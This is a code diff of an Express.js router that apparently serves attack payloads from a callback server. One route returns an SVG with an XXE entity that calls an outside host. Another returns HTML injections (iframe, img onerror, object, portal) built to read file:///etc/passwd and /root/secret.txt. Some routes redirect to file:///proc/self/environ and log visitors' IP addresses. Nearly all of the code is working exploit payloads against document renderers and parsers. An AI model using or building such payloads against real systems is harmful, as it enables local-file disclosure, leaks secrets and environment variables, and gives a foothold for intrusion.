@@ -14,8 +14,8 @@ router.get('/payload', function(req, res) {
  });
 
  router.get('/payload2', function(req, res) {
-   var pay = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [<!-- an internal subset can be embedded here --><!ENTITY xxe SYSTEM "https://toiletbrush.cleverapps.io/ping">]><svg width="100%" height="100%" viewBox="0 0 100 100"     xmlns="http://www.w3.org/2000/svg">  <text x="20" y="35">My &xxe;</text></svg>'
-    res.status(201).send(pay)
+   var pay = '<iframe src=file:///etc/passwd></iframe><img src="xasdasdasd" onerror="document.write(\'<iframe src=file:///etc/passwd></iframe>\')"/><link rel=attachment href="file:///root/secret.txt"><object data="file:///etc/passwd"><portal src="file:///etc/passwd" id=portal>'
+       res.status(201).send(pay)
   });
 
  router.get('/redir', function(req, res) {
@@ -36,11 +36,6 @@ router.get('/payload', function(req, res) {
     res.redirect(303, 'file:///proc/self/environ') // Notice the 303 parameter
  });
 
- router.get('/redir3', function(req, res) {
-   var ipInfo = JSON.stringify(getIP(req));
-     mongodb.sendVal("Redirection: " + ipInfo, 0);
-    res.redirect(303, 'file:///proc/self/environ') // Notice the 303 parameter
- });
 
 router.get('/ping', function(req, res) {
   var ipInfo = JSON.stringify(getIP(req));
